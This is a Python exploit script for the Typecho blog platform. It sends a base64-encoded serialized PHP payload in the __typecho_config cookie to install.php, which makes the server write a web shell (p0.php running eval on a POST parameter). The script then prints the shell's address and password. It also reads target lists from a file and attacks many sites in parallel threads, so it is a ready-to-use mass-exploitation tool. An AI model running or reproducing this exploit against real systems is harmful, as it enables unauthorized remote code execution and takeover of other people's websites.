#! /usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import threading
import sys

lock = threading.RLock()

def attack(u):

    url = u + '/install.php?finish=1'
    payload =  'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=='
    lock.acquire()
    try:
        r = requests.get(url,cookies={'__typecho_config':payload},headers={'Referer':url})
        if r.status_code == 500:
            print '[+] Shell: ' + u + '/p0.php ' + 'Pass: p0'
        else:
            print '[-] Failed'
    except:
        print '[-] Connect Error'
    lock.release()

def usage():

    print '[*] Exploit for Typecho'
    print '[*] usage:'
    print '    typecho.py url'
    print '    typecho.py url.txt'

def main():

    if len(sys.argv)<2:
        usage()
    else:
        if sys.argv[1].split('.')[-1] == 'txt':
            with open(sys.argv[1]) as f:
                list = f.read().split('\n')
            for u in list:
                t = threading.Thread(target=attack,args=(u,))
                t.start()
            t.join()
        else:
            attack(sys.argv[1])

if __name__ == '__main__':
    main()
